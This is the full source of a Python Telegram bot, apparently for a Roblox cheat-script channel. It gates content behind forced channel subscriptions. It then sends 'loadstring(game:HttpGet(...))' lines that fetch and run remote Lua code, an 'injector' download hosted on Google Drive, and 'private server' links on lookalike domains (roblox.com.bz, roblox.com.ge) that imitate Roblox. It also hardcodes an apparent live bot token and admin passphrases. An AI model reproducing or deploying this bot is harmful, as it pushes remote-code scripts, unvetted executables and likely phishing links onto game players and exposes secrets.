import telebot
import random
from telebot import types
import sqlite3
import os
import socket
from threading import Thread
import uuid

# ============================================================
# ТВОЙ ТОКЕН
# ============================================================
TOKEN = "8993935217:AAFxkEuK_lqK0FANyZbwlEvO6zyBtSEgOCM"
ADMIN_ID = 8091608667
ADMIN_SECRET = "larscriptkryyyyyyt"
ADMIN_SECRET2 = "кресло качалка"
BOT_USERNAME = "larskeys_bot"

DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_users.db")

HARDCODED_REFS = {
    "5e185ffd": "Спасибо за подписку! Вот скрипт:\n\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/fsfsfss323/key_system.lua/refs/heads/main/script.lua\"))()",
    "55fd5fde": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/fsfsfss323/selllemon.lua/refs/heads/main/sellemon.lua\"))()",
    "371bb522": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/fsfsfss323/cherber.lua/refs/heads/main/cherber.lua\"))()",
}

KOREAN_MM2_LINK = "https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
KOREAN_ADOPT_LINK = "https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844"

WEB_APP_URL = "https://fsfsfss323.github.io/webapp/"
WELCOME_IMAGE_URL = "https://i.yapx.ru/eBNdd.jpg"

# ============================================================
# СНАЧАЛА ОПРЕДЕЛЯЕМ ТЕКСТЫ
# ============================================================
GUIDE_TEXT = """
📖 *КАК ЗАПУСТИТЬ СКРИПТЫ?*

1️⃣ Скачай инжектор:
• Android: Delta, Arceus X, Vega X
• iOS: ScriptWare, Hydrogen
• PC: Xeno, Ro-Exec, Delta

2️⃣ Открой инжектор и нажми "Execute" или "Inject"

3️⃣ Вставь скрипт в поле ввода

4️⃣ Нажми "Run" или "Execute"

5️⃣ Готово! Скрипт запущен!

🔗 Где скачать инжектор?
• Delta: deltaexploits.net
• Arceus X: arceusx.com
• Xeno: discord.gg/xeno

⚠️ Используй только официальные сайты!
"""

GUIDE_TEXT_EN = """
📖 *HOW TO RUN SCRIPTS?*

1️⃣ Download injector:
• Android: Delta, Arceus X, Vega X
• iOS: ScriptWare, Hydrogen
• PC: Xeno, Ro-Exec, Delta

2️⃣ Open injector and click "Execute" or "Inject"

3️⃣ Paste script into input field

4️⃣ Click "Run" or "Execute"

5️⃣ Done! Script is running!

🔗 Where to download injector?
• Delta: deltaexploits.net
• Arceus X: arceusx.com
• Xeno: discord.gg/xeno

⚠️ Use only official websites!
"""

# ============================================================
# ПЕРЕВОДЫ
# ============================================================
LANGUAGES = {
    "ru": {
        "name": "Русский",
        "welcome_back": "✅ Добро пожаловать обратно!\n\nВыбери что хочешь получить:",
        "subscribe_prompt": "😌 Чтобы продолжить пользоваться ботом, пожалуйста, выполни следующие задания!",
        "ref_prompt": "🔗 Ты перешёл по реферальной ссылке!\n\nПодпишись на каналы и нажми проверить:",
        "check_sub": "🔍 Проверить подписку",
        "sub_confirm": "✅ Подписка подтверждена!",
        "sub_fail": "❌ Осталось подписаться:",
        "sub_fail_item": "❎ {name}",
        "check_again": "🔍 Проверить снова",
        "subscribe_channel": "Подписаться ✅ {name}",
        "unsub_channel": "Подписаться ❎ {name}",
        "menu_script": "📜 Скрипт на все игры",
        "menu_key": "🔑 Ключ для скрипта",
        "menu_private": "🔒 Приватный сервер MM2",
        "menu_servers": "🌐 ВСЕ СЕРВЕРА 🚀",
        "menu_korean_mm2": "😮 КОРЕЙСКИЙ СЕРВЕР ММ2 😮",
        "menu_korean_adopt": "💘 КОРЕЙСКИЙ СЕРВЕР АДОПТ МИ 💘",
        "menu_guide": "📖 Как запустить скрипт?",
        "menu_delta": "📥 Скачать инжектор (Delta)",
        "script_sent": "📜 Скрипт на все игры:\n\n{link}",
        "key_sent": "🔑 Твой ключ для скрипта:\n\n{key}",
        "private_sent": "🔒 Приватный сервер MM2\n\n{link}",
        "guide_text": GUIDE_TEXT,
        "admin_panel": "🛡 Админ панель\n\n👥 Пользователей: {users}\n🔗 Реф. ссылок: {refs} (вшитых: {hardcoded})\n\nВыбери действие:",
        "admin_stats": "📊 Статистика:\n👥 Пользователей: {users}\n🔗 Реф. ссылок: {refs} (вшитых: {hardcoded})",
        "admin_users_list": "👥 Пользователи ({count}):\n\n{list}",
        "admin_no_users": "👥 Пользователей пока нет.",
        "admin_broadcast_prompt": "📨 Введи текст рассылки (получат {count} чел.):",
        "admin_broadcast_done": "✅ Рассылка завершена! Отправлено: {sent}/{total}",
        "admin_ref_create_prompt": "📝 Введи текст который увидят ПОСЛЕ подписки:",
        "admin_ref_created": "✅ Ссылка создана:\n\n{link}\n\nТекст: {text}",
        "admin_ref_list": "📋 Вшитые ссылки:\n{hardcoded}\n\n📋 Ссылки из базы ({count}):\n{list}",
        "admin_ref_del_none": "🔗 Нет ссылок для удаления.",
        "admin_ref_del_choose": "Выбери ссылку для удаления:",
        "admin_ref_del_done": "✅ Ссылка удалена.",
        "admin_buttons": {
            "stats": "📊 Статистика",
            "users": "👥 Пользователи",
            "broadcast": "📨 Рассылка",
            "ref_create": "➕ Создать реф. ссылку",
            "ref_list": "📋 Список реф. ссылок",
            "ref_del": "🗑 Удалить реф. ссылку"
        },
        "language": "🌐 Выбери язык / Choose language:",
        "language_changed": "✅ Язык изменён на русский.",
        "key_instruction": "🔑 Твой ключ для скрипта:\n\n{key}",
        "getkey_prompt": "📢 Подпишитесь на каналы для получения скрипта и ключа",
    },
    "en": {
        "name": "English",
        "welcome_back": "✅ Welcome back!\n\nChoose what you want:",
        "subscribe_prompt": "😌 To continue using the bot, please complete the following tasks!",
        "ref_prompt": "🔗 You followed a referral link!\n\nSubscribe to the channels and press check:",
        "check_sub": "🔍 Check subscription",
        "sub_confirm": "✅ Subscription confirmed!",
        "sub_fail": "❌ Left to subscribe:",
        "sub_fail_item": "❎ {name}",
        "check_again": "🔍 Check again",
        "subscribe_channel": "Subscribe ✅ {name}",
        "unsub_channel": "Subscribe ❎ {name}",
        "menu_script": "📜 Script for all games",
        "menu_key": "🔑 Key for script",
        "menu_private": "🔒 Private server MM2",
        "menu_servers": "🌐 ALL SERVERS 🚀",
        "menu_korean_mm2": "😮 KOREAN MM2 SERVER 😮",
        "menu_korean_adopt": "💘 KOREAN ADOPT ME SERVER 💘",
        "menu_guide": "📖 How to run script?",
        "menu_delta": "📥 Download injector (Delta)",
        "script_sent": "📜 Script for all games:\n\n{link}",
        "key_sent": "🔑 Your key for script:\n\n{key}",
        "private_sent": "🔒 Private server MM2\n\n{link}",
        "guide_text": GUIDE_TEXT_EN,
        "admin_panel": "🛡 Admin panel\n\n👥 Users: {users}\n🔗 Ref. links: {refs} (hardcoded: {hardcoded})\n\nChoose action:",
        "admin_stats": "📊 Statistics:\n👥 Users: {users}\n🔗 Ref. links: {refs} (hardcoded: {hardcoded})",
        "admin_users_list": "👥 Users ({count}):\n\n{list}",
        "admin_no_users": "👥 No users yet.",
        "admin_broadcast_prompt": "📨 Enter broadcast text (will receive {count} users):",
        "admin_broadcast_done": "✅ Broadcast completed! Sent: {sent}/{total}",
        "admin_ref_create_prompt": "📝 Enter text that will be shown AFTER subscription:",
        "admin_ref_created": "✅ Link created:\n\n{link}\n\nText: {text}",
        "admin_ref_list": "📋 Hardcoded links:\n{hardcoded}\n\n📋 Links from DB ({count}):\n{list}",
        "admin_ref_del_none": "🔗 No links to delete.",
        "admin_ref_del_choose": "Choose link to delete:",
        "admin_ref_del_done": "✅ Link deleted.",
        "admin_buttons": {
            "stats": "📊 Statistics",
            "users": "👥 Users",
            "broadcast": "📨 Broadcast",
            "ref_create": "➕ Create ref link",
            "ref_list": "📋 Ref links list",
            "ref_del": "🗑 Delete ref link"
        },
        "language": "🌐 Choose language / Выбери язык:",
        "language_changed": "✅ Language changed to English.",
        "key_instruction": "🔑 Your key for script:\n\n{key}",
        "getkey_prompt": "📢 Subscribe to channels to get script and key",
    }
}

# ============================================================
# БАЗА ДАННЫХ
# ============================================================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, ref_code TEXT, subscribed BOOLEAN DEFAULT 0, language TEXT DEFAULT NULL)")
    c.execute("CREATE TABLE IF NOT EXISTS ref_links (id INTEGER PRIMARY KEY AUTOINCREMENT, link TEXT UNIQUE, message TEXT)")
    conn.commit()
    conn.close()

def add_user(user_id, ref_code=None):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    exists = c.fetchone()
    if not exists:
        try:
            c.execute("INSERT INTO users (user_id, ref_code, subscribed, language) VALUES (?, ?, 0, NULL)", (user_id, ref_code))
            conn.commit()
        except:
            pass
        conn.close()
        return True
    else:
        if ref_code:
            try:
                c.execute("UPDATE users SET ref_code = ? WHERE user_id = ?", (ref_code, user_id))
                conn.commit()
            except:
                pass
    conn.close()
    return False

def set_user_subscribed(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET subscribed = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def is_user_subscribed(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT subscribed FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row and row[0] == 1

def get_user_language(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT language FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row and row[0] in LANGUAGES else None

def set_user_language(user_id, lang):
    if lang not in LANGUAGES:
        lang = None
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET language = ? WHERE user_id = ?", (lang, user_id))
    conn.commit()
    conn.close()

def get_user_ref_code(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT ref_code FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def create_ref_link(message):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    ref = str(uuid.uuid4())[:8]
    c.execute("INSERT INTO ref_links (link, message) VALUES (?, ?)", (ref, message))
    conn.commit()
    conn.close()
    return ref

def get_ref_message(ref):
    if ref in HARDCODED_REFS:
        return HARDCODED_REFS[ref]
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT message FROM ref_links WHERE link = ?", (ref,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def get_all_ref_links():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, link, message FROM ref_links")
    links = c.fetchall()
    conn.close()
    return links

def delete_ref_link(link_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM ref_links WHERE id = ?", (link_id,))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = [row[0] for row in c.fetchall()]
    conn.close()
    return users

def count_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    conn.close()
    return count

init_db()

CHANNELS = [
    {"name": "freprivatka34", "url": "https://t.me/freprivatka34"},
    {"name": "freegodlymm2_67", "url": "https://t.me/freegodlymm2_67"},
    {"name": "keyscripts3", "url": "https://t.me/keyscripts3"}
]

KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR", "MALTUIPY"]
PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"

bot = telebot.TeleBot(TOKEN)

def notify_admin(text):
    try:
        bot.send_message(ADMIN_ID, text)
    except:
        pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_unsubscribed_channels(user_id):
    not_subbed = []
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(f"@{ch['name']}", user_id)
            if member.status not in ["member", "administrator", "creator"]:
                not_subbed.append(ch)
        except:
            not_subbed.append(ch)
    return not_subbed

def get_language_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(types.InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"))
    keyboard.add(types.InlineKeyboardButton("🇬🇧 English", callback_data="lang_en"))
    return keyboard

def show_language_selection(chat_id, message_id=None):
    text = "🌐 Выбери язык / Choose language:"
    keyboard = get_language_keyboard()
    if message_id:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=keyboard)
    else:
        bot.send_message(chat_id, text, reply_markup=keyboard)

def proceed_after_language(message, lang):
    t = LANGUAGES[lang]
    user_id = message.from_user.id
    
    if is_user_subscribed(user_id):
        caption = t["welcome_back"]
        bot.send_photo(
            message.chat.id,
            photo=WELCOME_IMAGE_URL,
            caption=caption,
            reply_markup=get_success_keyboard(lang)
        )
    else:
        args = message.text.split() if message.text else []
        is_ref = len(args) > 1 and args[1].startswith("ref_")
        if is_ref:
            bot.send_message(message.chat.id, t["ref_prompt"], reply_markup=get_channels_keyboard(is_ref=True, lang=lang))
        else:
            bot.send_message(message.chat.id, t["subscribe_prompt"], reply_markup=get_channels_keyboard(is_ref=False, lang=lang))

def get_channels_keyboard(is_ref=False, lang="ru"):
    t = LANGUAGES[lang]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        keyboard.add(types.InlineKeyboardButton(
            text=t["subscribe_channel"].format(name=ch['name']),
            url=ch['url']
        ))
    cb = "check_sub_ref" if is_ref else "check_sub"
    keyboard.add(types.InlineKeyboardButton(text=t["check_sub"], callback_data=cb))
    return keyboard

def get_unsub_keyboard(not_subbed, is_ref=False, lang="ru"):
    t = LANGUAGES[lang]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in not_subbed:
        keyboard.add(types.InlineKeyboardButton(
            text=t["unsub_channel"].format(name=ch['name']),
            url=ch['url']
        ))
    cb = "check_sub_ref" if is_ref else "check_sub"
    keyboard.add(types.InlineKeyboardButton(text=t["check_again"], callback_data=cb))
    return keyboard

def get_success_keyboard(lang="ru"):
    t = LANGUAGES[lang]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(types.InlineKeyboardButton(text=t["menu_script"], callback_data="get_script"))
    keyboard.add(types.InlineKeyboardButton(text=t["menu_key"], callback_data="get_key"))
    keyboard.add(types.InlineKeyboardButton(text=t["menu_private"], callback_data="get_private"))
    keyboard.add(types.InlineKeyboardButton(
        text=t["menu_servers"],
        web_app=types.WebAppInfo(url=WEB_APP_URL)
    ))
    keyboard.add(types.InlineKeyboardButton(text=t["menu_korean_mm2"], url=KOREAN_MM2_LINK))
    keyboard.add(types.InlineKeyboardButton(text=t["menu_korean_adopt"], url=KOREAN_ADOPT_LINK))
    keyboard.add(types.InlineKeyboardButton(text=t["menu_guide"], callback_data="get_guide"))
    keyboard.add(types.InlineKeyboardButton(text=t["menu_delta"], url=DELTA_LINK))
    keyboard.add(types.InlineKeyboardButton(text="🌐 Language / Язык", callback_data="change_language"))
    return keyboard

def get_admin_keyboard(lang="ru"):
    t = LANGUAGES[lang]
    btns = t["admin_buttons"]
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(types.InlineKeyboardButton(btns["stats"], callback_data="admin_stats"))
    keyboard.add(types.InlineKeyboardButton(btns["users"], callback_data="admin_users_list"))
    keyboard.add(types.InlineKeyboardButton(btns["broadcast"], callback_data="admin_broadcast"))
    keyboard.add(types.InlineKeyboardButton(btns["ref_create"], callback_data="admin_ref_create"))
    keyboard.add(types.InlineKeyboardButton(btns["ref_list"], callback_data="admin_ref_list"))
    keyboard.add(types.InlineKeyboardButton(btns["ref_del"], callback_data="admin_ref_del"))
    return keyboard

# ============================================================
# ОБРАБОТЧИКИ КОМАНД
# ============================================================
@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.from_user.id
    add_user(user_id)  # Добавляем пользователя, если его нет
    
    # ВСЕГДА ПОКАЗЫВАЕМ ВЫБОР ЯЗЫКА ПРИ /start
    show_language_selection(message.chat.id)

@bot.message_handler(commands=["language"])
def language_command(message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)
    if lang is None:
        show_language_selection(message.chat.id)
    else:
        t = LANGUAGES[lang]
        bot.send_message(message.chat.id, t["language"], reply_markup=get_language_keyboard())

@bot.message_handler(commands=["getkey"])
def getkey(message):
    add_user(message.from_user.id)
    lang = get_user_language(message.from_user.id)
    if lang is None:
        show_language_selection(message.chat.id)
        return
    t = LANGUAGES[lang]
    not_subbed = get_unsubscribed_channels(message.from_user.id)
    if not not_subbed:
        k = random.choice(KEYS)
        bot.send_message(message.chat.id, t["key_sent"].format(key=k))
    else:
        bot.send_message(message.chat.id, t["getkey_prompt"], reply_markup=get_unsub_keyboard(not_subbed, is_ref=False, lang=lang))

@bot.message_handler(func=lambda m: m.text == ADMIN_SECRET)
def admin_panel(message):
    if not is_admin(message.from_user.id):
        return
    lang = get_user_language(message.from_user.id)
    if lang is None:
        show_language_selection(message.chat.id)
        return
    t = LANGUAGES[lang]
    refs = len(get_all_ref_links()) + len(HARDCODED_REFS)
    text = t["admin_panel"].format(users=count_users(), refs=refs, hardcoded=len(HARDCODED_REFS))
    bot.send_message(message.chat.id, text, reply_markup=get_admin_keyboard(lang))

@bot.message_handler(func=lambda m: m.text == ADMIN_SECRET2)
def broadcast_panel(message):
    if not is_admin(message.from_user.id):
        return
    lang = get_user_language(message.from_user.id)
    if lang is None:
        show_language_selection(message.chat.id)
        return
    t = LANGUAGES[lang]
    msg = bot.send_message(message.chat.id, t["admin_broadcast_prompt"].format(count=count_users()))
    bot.register_next_step_handler(msg, broadcast_start)

def broadcast_start(message):
    users = get_all_users()
    count = 0
    for uid in users:
        try:
            bot.send_message(uid, message.text)
            count += 1
        except:
            pass
    lang = get_user_language(message.from_user.id)
    t = LANGUAGES[lang] if lang else LANGUAGES["ru"]
    bot.send_message(message.chat.id, t["admin_broadcast_done"].format(sent=count, total=len(users)))

# ============================================================
# ОБРАБОТЧИК CALLBACK
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def user_callback(call):
    action = call.data
    user_id = call.from_user.id

    # Обработка выбора языка
    if action.startswith("lang_"):
        lang_code = action.split("_")[1]
        if lang_code not in LANGUAGES:
            bot.answer_callback_query(call.id, "Invalid language")
            return
        
        set_user_language(user_id, lang_code)
        bot.answer_callback_query(call.id, LANGUAGES[lang_code]["language_changed"])
        
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        
        class FakeMessage:
            def __init__(self, chat_id, from_user, text):
                self.chat = type('obj', (object,), {'id': chat_id})()
                self.from_user = from_user
                self.text = text
        fake_msg = FakeMessage(call.message.chat.id, call.from_user, "")
        proceed_after_language(fake_msg, lang_code)
        return

    # Если язык не выбран, предлагаем выбрать
    lang = get_user_language(user_id)
    if lang is None:
        bot.answer_callback_query(call.id, "Сначала выберите язык / Choose language first")
        show_language_selection(call.message.chat.id, call.message.message_id)
        return

    t = LANGUAGES[lang]

    if action in ["check_sub", "check_sub_ref"]:
        is_ref = action == "check_sub_ref"
        not_subbed = get_unsubscribed_channels(user_id)
        if not not_subbed:
            set_user_subscribed(user_id)
            if is_ref:
                ref_code = get_user_ref_code(user_id)
                ref_msg = get_ref_message(ref_code) if ref_code else None
                bot.send_message(call.message.chat.id, ref_msg if ref_msg else t["sub_confirm"])
            else:
                bot.send_photo(
                    call.message.chat.id,
                    photo=WELCOME_IMAGE_URL,
                    caption=t["sub_confirm"] + "\n\n" + t["welcome_back"],
                    reply_markup=get_success_keyboard(lang)
                )
        else:
            text = t["sub_fail"] + "\n"
            for ch in not_subbed:
                text += t["sub_fail_item"].format(name=ch['name']) + "\n"
            bot.send_message(call.message.chat.id, text, reply_markup=get_unsub_keyboard(not_subbed, is_ref, lang))
        bot.answer_callback_query(call.id)
        return

    elif action == "get_script":
        bot.send_message(call.message.chat.id, t["script_sent"].format(link=SCRIPT_LINK))
        bot.answer_callback_query(call.id)
        user = call.from_user
        notify_admin(f"📥 Запросили скрипт!\n\n👤 {user.first_name}\n📛 @{user.username or 'нет'}\n🆔 {user.id}")

    elif action == "get_key":
        k = random.choice(KEYS)
        bot.send_message(call.message.chat.id, t["key_sent"].format(key=k))
        bot.answer_callback_query(call.id)
        user = call.from_user
        notify_admin(f"🔑 Запросили ключ!\n\n👤 {user.first_name}\n📛 @{user.username or 'нет'}\n🆔 {user.id}\n🔑 Ключ: {k}")

    elif action == "get_private":
        bot.send_message(call.message.chat.id, t["private_sent"].format(link=PRIVATE_SERVER_LINK))
        bot.answer_callback_query(call.id)

    elif action == "get_guide":
        if lang == "ru":
            bot.send_message(call.message.chat.id, GUIDE_TEXT, parse_mode="Markdown")
        else:
            bot.send_message(call.message.chat.id, GUIDE_TEXT_EN, parse_mode="Markdown")
        bot.answer_callback_query(call.id)

    elif action == "admin_ref_create":
        if not is_admin(user_id):
            return
        msg = bot.send_message(call.message.chat.id, t["admin_ref_create_prompt"])
        bot.register_next_step_handler(msg, create_ref_with_message)
        bot.answer_callback_query(call.id)

    elif action == "admin_ref_list":
        if not is_admin(user_id):
            return
        links = get_all_ref_links()
        hardcoded_text = ""
        for ref, msg in HARDCODED_REFS.items():
            hardcoded_text += f"• {ref} — {msg[:40]}...\n"
        list_text = ""
        for l in links:
            list_text += f"• {l[1]} — {l[2][:30]}...\n" if l[2] else f"• {l[1]}\n"
        text = t["admin_ref_list"].format(hardcoded=hardcoded_text, count=len(links), list=list_text)
        bot.send_message(call.message.chat.id, text)
        bot.answer_callback_query(call.id)

    elif action == "admin_ref_del":
        if not is_admin(user_id):
            return
        links = get_all_ref_links()
        if not links:
            bot.send_message(call.message.chat.id, t["admin_ref_del_none"])
        else:
            keyboard = types.InlineKeyboardMarkup(row_width=1)
            for l in links:
                keyboard.add(types.InlineKeyboardButton(f"❌ {l[1]}", callback_data=f"admin_delref_{l[0]}"))
            bot.send_message(call.message.chat.id, t["admin_ref_del_choose"], reply_markup=keyboard)
        bot.answer_callback_query(call.id)

    elif action.startswith("admin_delref_"):
        if not is_admin(user_id):
            return
        link_id = int(action.replace("admin_delref_", ""))
        delete_ref_link(link_id)
        bot.send_message(call.message.chat.id, t["admin_ref_del_done"])
        bot.answer_callback_query(call.id)

    elif action == "admin_stats":
        if not is_admin(user_id):
            return
        refs = len(get_all_ref_links()) + len(HARDCODED_REFS)
        text = t["admin_stats"].format(users=count_users(), refs=refs, hardcoded=len(HARDCODED_REFS))
        bot.send_message(call.message.chat.id, text)
        bot.answer_callback_query(call.id)

    elif action == "admin_users_list":
        if not is_admin(user_id):
            return
        users = get_all_users()
        if not users:
            bot.send_message(call.message.chat.id, t["admin_no_users"])
        else:
            list_text = "\n".join(f"• {u}" for u in users[:50])
            if len(users) > 50:
                list_text += f"\n... и ещё {len(users) - 50}"
            bot.send_message(call.message.chat.id, t["admin_users_list"].format(count=len(users), list=list_text))
        bot.answer_callback_query(call.id)

    elif action == "admin_broadcast":
        if not is_admin(user_id):
            return
        msg = bot.send_message(call.message.chat.id, t["admin_broadcast_prompt"].format(count=count_users()))
        bot.register_next_step_handler(msg, broadcast_start)
        bot.answer_callback_query(call.id)

    elif action == "change_language":
        bot.send_message(call.message.chat.id, t["language"], reply_markup=get_language_keyboard())
        bot.answer_callback_query(call.id)

    else:
        bot.answer_callback_query(call.id)

def create_ref_with_message(message):
    msg_text = message.text
    ref = create_ref_link(msg_text)
    link = f"https://t.me/{BOT_USERNAME}?start=ref_{ref}"
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    t = LANGUAGES[lang]
    bot.send_message(message.chat.id, t["admin_ref_created"].format(link=link, text=msg_text))

def run_server():
    port = int(os.environ.get("PORT", 10000))
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    while True:
        c, _ = s.accept()
        c.send(b"HTTP/1.1 200 OK\r\n\r\nBot running")
        c.close()

Thread(target=run_server).start()
bot.polling()
